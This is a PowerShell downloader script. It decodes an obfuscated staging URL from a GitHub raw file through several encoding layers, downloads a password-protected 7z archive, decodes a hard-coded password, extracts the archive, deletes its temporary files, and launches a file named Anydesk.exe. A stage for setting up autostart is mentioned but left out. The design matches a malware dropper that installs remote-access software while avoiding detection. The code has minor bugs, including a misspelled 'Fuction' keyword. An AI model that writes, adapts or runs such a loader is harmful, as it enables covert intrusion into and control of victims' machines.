# Stage 1: Fetch text from URL
Function FetchTextFromURL {
    Param ([string]$url)
    $rawText = Invoke-RestMethod -Uri $url
    # Trim leading and trailing whitespace and newline characters
    $trimmedText = $rawText.Trim()
    # Write-Host "Stage 1 - Raw Text:" $trimmedText
	Write-Host "Stage 1 Complete - Raw Text Fetched"
    return $trimmedText
}

# Adjusted Stage 2: Decode the text into binary
Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    $binaryString = $encodedString -replace ',', '0' -replace '\.', '1'
    # Calculate the number of bits to pad the binary string to make it a multiple of 8
    $paddingLength = (8 - ($binaryString.Length % 8)) % 8
    # Pad the binary string with '0's if needed
    $binaryString = $binaryString.PadRight($binaryString.Length + $paddingLength, '0')
    # Write-Host "Stage 2 - Binary String with padding if needed:" $binaryString
	Write-Host "Stage 2 Complete - Binary Obtained"
    return $binaryString
}


# Adjusted Stage 3: Decode binary into hex
Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    # Split the binary string into groups of 8 bits
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    # Initialize an array to hold the hexadecimal values
    $hexArray = @()
    foreach ($group in $binaryGroups) {
        if ($group.Length -eq 8 -and $group -match '^[01]{8}$') {
            # Convert binary group to a hexadecimal value and add it to the array
            $hexArray += '{0:X}' -f [Convert]::ToInt32($group, 2)
        } else {
            # Write-Host "Skipping invalid binary group: '$group'"
            # Skip the invalid group and continue processing
        }
    }
    # Join the hexadecimal values into a single string
    $hexString = $hexArray -join ''
    # Write-Host "Stage 3 - Hex String:" $hexString
	Write-Host "Stage 3 Complete - Hex Obtained"
    return $hexString
}


# Adjusted Stage 4: Decode hex into ASCII
Function Convert-HexToASCII {
    Param ([string]$hexString)
    try {
        $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            [Convert]::ToByte($hexString.Substring($i, 2), 16)
        }
        $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    } catch {
        Write-Error "An error occurred during hex to ASCII conversion: $_"
        $asciiText = $null
    }
    # Write-Host "Stage 4 - ASCII Text (Final URL):" $asciiText
	Write-Host "Stage 4 Complete - Payload Obtained"
    return $asciiText
}

# Stage 5: Create temp folder
Function CreateTempFolder {
    $tempFolderPath = "S:\downloader\temp"
    $temp7zFolderPath = "S:\downloader\temp\7zip"
	$loadPath = "S:\downloader\load"
    New-Item -ItemType Directory -Force -Path $tempFolderPath | Out-Null   
    New-Item -ItemType Directory -Force -Path $temp7zFolderPath | Out-Null
	New-Item -ItemType Directory -Force -Path $loadPath | Out-Null
    return $tempFolderPath
}

# Stage 6: Download file from final URL
Function Download-File {
    Param (
        [string]$url,
        [string]$path
    )
    try {
        # Write-Host "Downloading file from URL: $url"
        # Write-Host "Destination path: $path"
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
        Write-Host "File downloaded successfully."
    } catch {
        Write-Error "An error occurred while downloading the file from URL: $url"
        Write-Error "Error details: $_"
    }
}

# Stage 7 & 8: Download and extract portable zipped 7z executable
Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
    $tempFolderPath = CreateTempFolder
    $sevenZipDownloadPath = "S:\downloader\temp\7zip\7za.zip"
    $sevenZipExtractPath = "S:\downloader\temp\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
    return $sevenZipExtractPath
}

# Stage 9: Decode password
Function Get-DecryptedPassword {
    $hardcodedBinary = "0011000100110010001100110011010000110101"
	# Split the binary into groups of 8
	$binaryGroups = $hardcodedBinary -split '(?<=\G.{8})'
	# Initialize password variable
	$password = ""
	foreach ($group in $binaryGroups) {
		if ($group.Length -eq 8) {
			# Convert binary group to a character and append it to the password
			$password += [char][Convert]::ToInt32($group,2)
		}
	}
    # $password = ($hardcodedBinary -split '(?<=\G.{8})' | ForEach-Object { [char][Convert]::ToInt32($_, 2) }) -join ''
    # Write-Host "Display password:"
	Write-Host "Stage 9 Complete - Password Decrypted"
    Write-Host $password
    return $password
}

# Stage 10: Use 7z to unzip the file
Function UnzipFileWith7Zip {
    Param (
        [string]$sevenZipCmdPath,
        [string]$filePath,
        [string]$outputPath,
        [string]$password
    )
    S:\downloader\temp\7zip\7za.exe x S:\downloader\temp\DownloadedFile.7z -o"$outputPath" -p"$password"
}

# Stage 11: Setup for autostart not implemented for brevity

# Stage 12: Start the file
Fuction Launch {
	Param ([string]$extractedFilePath)
	 if (Test-Path -Path $extractedFilePath) {
	 	Invoke-Item $extractedFilePath
		} else {
		    Write-Error "The extracted file does not exist."
		}
 }
# Stage 13: Cleanup - Delete the temp folder and setup files
Function Cleanup {
    Param ([string]$folderPath)
    Remove-Item -Path $folderPath -Recurse -Force
	Write-Host "Stage 13 Complete - Temp n Worker Files deleted"
}

# Script Execution Example (Uncomment as needed for debugging)

$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt"
$rawText = FetchTextFromURL -url $url
$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$finalUrl = Convert-HexToASCII -hexString $hexString
$finalUrl = Convert-HexToASCII -hexString $finalUrl
$tempFolderPath = CreateTempFolder
$downloadPath = "$tempFolderPath\DownloadedFile.7z"
Download-File -url $finalUrl -path S:\downloader\temp\DownloadedFile.7z
DownloadAndExtract7Zip
$password = Get-DecryptedPassword
$sevenZipCmdPath = "$sevenZipExtractPath\7za.exe"
UnzipFileWith7Zip -filePath $downloadPath -outputPath "S:\downloader\load" -password $password
Cleanup -folderPath $tempFolderPath
Launch -extractedFilePath "S:\downloader\load\Anydesk.exe"

# if ($binaryString -ne $null) {
#     $hexString = Convert-BinaryToHex -binaryString $binaryString
# }
# if ($hexString -ne $null) {
#     $finalUrl = Convert-HexToASCII -hexString $hexString
# }
